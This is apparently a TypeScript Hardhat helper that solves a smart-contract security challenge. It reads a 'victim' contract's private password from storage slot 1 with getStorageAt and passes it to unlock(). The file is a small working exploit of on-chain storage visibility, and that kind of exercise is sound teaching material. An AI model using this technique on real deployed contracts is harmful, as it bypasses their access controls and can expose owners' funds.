import { expect } from "chai";
import { ethers, waffle } from "hardhat";
const helper = async (victim: any) => {
  const provider = waffle.provider;
  const result = await provider.getStorageAt(victim.address, 1);
  const passwd = ethers.utils.parseBytes32String(result);
  console.log(passwd);
  await victim.unlock(result);
};

export default helper;
